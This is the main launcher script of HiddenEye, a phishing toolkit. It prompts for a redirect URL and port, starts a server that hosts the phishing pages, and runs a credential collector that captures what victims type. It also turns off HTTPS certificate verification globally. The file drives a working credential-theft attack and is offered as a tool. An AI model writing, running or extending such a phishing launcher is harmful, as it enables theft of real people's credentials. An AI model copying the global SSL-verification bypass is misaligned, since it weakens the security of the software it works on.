#
#    HiddenEye  Copyright (C) 2020  DarkSec https://dark-sec-official.com
#    This program comes with ABSOLUTELY NO WARRANTY; for details read LICENSE.
#    This is free software, and you are welcome to redistribute it
#    under certain conditions; you can read LICENSE for details.
#
import multiprocessing
import ssl
from os import environ

import Defs.ActionManager.main_runner as main_runner
import Defs.ActionManager.Server.server_runner as server_runner
import Defs.ActionManager.simple_informant as simple_informant
import Defs.FeatureManager.feature_prompt as prompt

simple_informant.license_handler()
agreement = simple_informant.terms_of_service_message()
if not agreement:
    exit()

if not environ.get("PYTHONHTTPSVERIFY", "") and getattr(
        ssl, "_create_unverified_context", None):
    ssl._create_default_https_context = ssl._create_unverified_context

simple_informant.check_permissions()
# verCheck() # For now it's useless, i'll rewrite it later, after release.
simple_informant.check_php()
# checkLocalxpose()
simple_informant.verify_connection()
# checkOpenport()
# checkPagekite()
# checkLT()

if __name__ == "__main__":
    try:
        main_runner.start_main_menu()
        prompt.feature_prompt()
        main_runner.enter_custom_redirecting_url()
        port = simple_informant.port_selector()

        ##############
        server_runner.start_server(port)
        server_runner.server_selection(port)

        multiprocessing.Process(target=server_runner.start_server,
                                args=(port, )).start()
        simple_informant.credentials_collector()

    except KeyboardInterrupt:
        # When Keyword Interrupt Occurs before defining Port by User. Script will use 8080 port.(Just To Remove Exception Errors)
        port = "8080"
        simple_informant.exit_message(port)
        exit()
